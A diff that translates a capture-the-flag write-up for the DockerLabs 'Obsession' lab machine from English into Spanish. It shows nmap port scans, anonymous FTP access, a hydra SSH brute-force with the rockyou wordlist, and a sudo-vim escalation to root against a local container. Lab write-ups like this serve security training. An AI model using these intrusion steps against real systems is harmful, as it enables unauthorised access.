@@ -1,10 +1,10 @@
-# Write Up Obsession
+# Writeup Obsession
 
 **Difficulty:** Super easy  
-**Link to dockerlabs:** https://dockerlabs.es/
+**Dockerlabs link:** [https://dockerlabs.es/](https://dockerlabs.es/)
 
-## Setting up the environment
-First of all, we deploy the machine using the script that comes when downloading it:
+## Preparación del entorno
+Lo primero es desplegar la máquina con el script que viene al descargarla:
 ```
 ❯ chmod +x auto_deploy.sh
 ❯ sudo ./auto_deploy.sh obsession.tar
@@ -18,11 +18,11 @@ First of all, we deploy the machine using the script that comes when downloading
 	      \______ o          __/           
 	        \    \        __/            
 	         \____\______/               
-                                          
+                                           
   ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
   |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
   |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
-                                         
+                                          
 				    
 
 Estamos desplegando la máquina vulnerable, espere un momento.
@@ -32,7 +32,7 @@ Máquina desplegada, su dirección IP es -→ 172.17.0.2
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
 ```
 
-Once deployed, we create the folder `obsession-dockerlabs`, move inside, and use the *mkt* utility, which creates the folders *nmap*, *content*, *exploits* and *scripts*.
+Una vez desplegada, creamos la carpeta `obsession-dockerlabs`, entramos y usamos la utilidad *mkt*, que crea las carpetas *nmap*, *content*, *exploits* y *scripts*.
 
 ```
 ❯ mkdir obsession-dockerlabs
@@ -46,7 +46,7 @@ drwxrwxr-x godack godack 4.0 KB Tue Aug 19 10:06:44 2025 scripts
 ```
 
 ## Recon
-As usual, we start with a quick and stealthy scan on the victim’s IP to discover open ports. Then, we run a more thorough scan only on those ports (which makes it faster than scanning all 65k).
+Como siempre, empezamos con un escaneo rápido y sigiloso a la IP víctima para descubrir puertos abiertos. Luego lanzamos un escaneo más exhaustivo solo sobre esos puertos (que es más rápido que escanear los 65k).
 
 ```
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
@@ -71,7 +71,7 @@ PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 64
 ```
 
-Now we use the *extractPorts* utility to copy the ports to clipboard and perform a detailed scan:
+Ahora usamos la utilidad *extractPorts* para copiar los puertos al portapapeles y hacer un escaneo detallado:
 
 ```
 ❯ extractPorts allPorts
@@ -119,10 +119,10 @@ PORT   STATE SERVICE VERSION
 |_http-title: Russoski Coaching
 ```
 
-Open ports: FTP (21), SSH (22), HTTP (80).
+Puertos abiertos: FTP (21), SSH (22), HTTP (80).
 
-## Exploitation
-Since FTP is open, we first check if *anonymous* login is allowed — and it is:
+## Explotación
+Como FTP está abierto, primero comprobamos si el login *anonymous* está permitido — y lo está:
 
 ```
 ❯ ftp obsession
@@ -136,7 +136,7 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ```
 
-Listing files shows two: *chat-gonza.txt* and *pendientes.txt*. We download and inspect them:
+Al listar ficheros vemos dos: *chat-gonza.txt* y *pendientes.txt*. Los descargamos y los inspeccionamos:
 
 ```
 ftp> ls
@@ -161,7 +161,7 @@ local: pendientes.txt remote: pendientes.txt
 315 bytes received in 00:00 (465.38 KiB/s)
 ```
 
-From the contents, we deduce there are two possible users: **Gonza** and **Russoski**.
+Por el contenido, deducimos que hay dos posibles usuarios: **Gonza** y **Russoski**.
 
 ```
 ❯ cat chat-gonza.txt
@@ -190,7 +190,7 @@ From the contents, we deduce there are two possible users: **Gonza** and **Russo
 ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-While running brute force attacks with *hydra* on SSH for both users, we investigate the website. It seems Russoski is the main user, and indeed, *hydra* finds his password:
+Mientras lanzamos fuerza bruta con *hydra* a SSH para ambos usuarios, investigamos la web. Parece que Russoski es el usuario principal, y efectivamente *hydra* encuentra su contraseña:
 
 ```
 ❯ hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://obsession
@@ -208,7 +208,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-19 10:48:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-19 10:49:34
 ```
 
-We log in via SSH:
+Entramos por SSH:
 
 ```
 ❯ ssh russoski@obsession
@@ -227,8 +227,8 @@ Last login: Tue Jun 18 04:38:10 2024 from 172.17.0.1
 russoski@c1489df97f06:~$
 ```
 
-## Privilege Escalation
-For a more comfortable shell, we fix the tty:
+## Escalada de privilegios
+Para una shell más cómoda, arreglamos el tty:
 
 ```
 script /dev/null -c bash
@@ -237,7 +237,7 @@ reset xterm
 export TERM=xterm
 ```
 
-We check sudo permissions and exploit this to spawn a root shell:
+Comprobamos permisos de sudo y abusamos de esto para lanzar una shell como root:
 
 ```
 russoski@c1489df97f06:~$ sudo -l
@@ -253,10 +253,10 @@ root
 root@c1489df97f06:/home/russoski# 
 ```
 
-Root obtained!
+¡Root conseguido!
 
-## Lessons Learned
-1. Scans with **nmap**
-2. *Anonymous* login on the *FTP* port
-3. Brute force attack with **hydra**
-4. Privilege escalation with **vim**
+## Lecciones aprendidas
+1. Escaneos con **nmap**
+2. Login *anonymous* en el puerto *FTP*
+3. Ataque de fuerza bruta con **hydra**
+4. Escalada de privilegios con **vim**
